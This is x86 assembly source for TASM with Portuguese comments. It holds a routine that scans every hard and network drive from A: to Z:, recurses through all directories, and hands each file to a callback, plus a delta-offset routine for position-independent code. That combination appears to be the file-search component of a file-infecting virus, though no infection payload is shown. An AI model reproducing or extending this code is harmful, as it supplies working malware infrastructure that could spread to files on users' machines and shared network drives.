;for TASM

busca_recursiva:                                ;parametro=rotina de arquivo
       pushad
       sub esp, 4
       mov ebp, esp
       call delta2                               ;esi==delta
       mov [ebp], "\:@"                         ;inicia busca por A:\
  proximo_disco:
       cmp by [ebp], "Z"
       je feito                                 ;se j  tamos no Z:\, para
       inc by [ebp]
       push ebp
       call dwo [esi+GetDriveType]
       cmp al, 3                                ;‚ disco rigido?
       je fixo
       cmp al, 4                                ;ou disco de rede?
       jne proximo_disco
  fixo:
       push ebp
       call dwo [esi+SetCurrentDirectoryA]
       test eax, eax
       jz proximo_disco
       push dwo [esp+(8*4)+8]                   ;rotina CALLBACK
       call busca_disco                         ;busca dentro dos diretorios
       jmp proximo_disco
  feito:
       add esp, 4
       popad
       ret 4

busca_disco:
       pushad
       sub esp, SIZEOF_WIN32_FIND_DATA+4+4+4
       mov ebp, esp
       call delta2
       mov dwo [ebp.SIZEOF_WIN32_FIND_DATA], "*.*"         ;constroi mascara de busca
       mov dwo [ebp.SIZEOF_WIN32_FIND_DATA+4+4], ".."      ;e para mudar de diretorio
       lea eax, [ebp.SIZEOF_WIN32_FIND_DATA]
       push ebp
       push eax
       call dwo [esi+FindFirstFileA]
       mov dwo [ebp.SIZEOF_WIN32_FIND_DATA+4], eax         ;salva handle da busca
       inc eax
       jz sobe_dir
  verifica_dir:
       lea eax, [ebp.WFD_szFileName]
       test dwo [ebp.WFD_dwFileAttributes], 10h
       jnz e_dir
       push eax
       call [esp+(8*4)+(SIZEOF_WIN32_FIND_DATA+4+4+4)+8]    ;chama CALLBACK
  continua_busca:
       push ebp
       push dwo [ebp.SIZEOF_WIN32_FIND_DATA+4]
       call dwo [esi+FindNextFileA]                 ;procura proximo arquivo
       test eax, eax
       jnz verifica_dir
  sobe_dir:
       push dwo [ebp.SIZEOF_WIN32_FIND_DATA+4]
       call dwo [esi+FindClose]
       lea eax, [ebp.SIZEOF_WIN32_FIND_DATA+4+4]       ;ponteiro para ".."
       push eax
       call dwo [esi+SetCurrentDirectoryA]
       add esp, SIZEOF_WIN32_FIND_DATA+4+4+4
       popad
       ret 4
  e_dir:
       cmp by [eax], '.'
       je continua_busca                        ;evita travar
       push eax
       call dwo [esi+SetCurrentDirectoryA]          ;entra no diretorio
       test eax, eax
       jz continua_busca
       push dwo [esp+(8*4)+(SIZEOF_WIN32_FIND_DATA+4+4+4)+4]
       call busca_disco                         ;busca recursiva
       jmp continua_busca

delta2:
       call delta3
  delta3:
       pop esi
       sub esi, ofs delta3
       ret
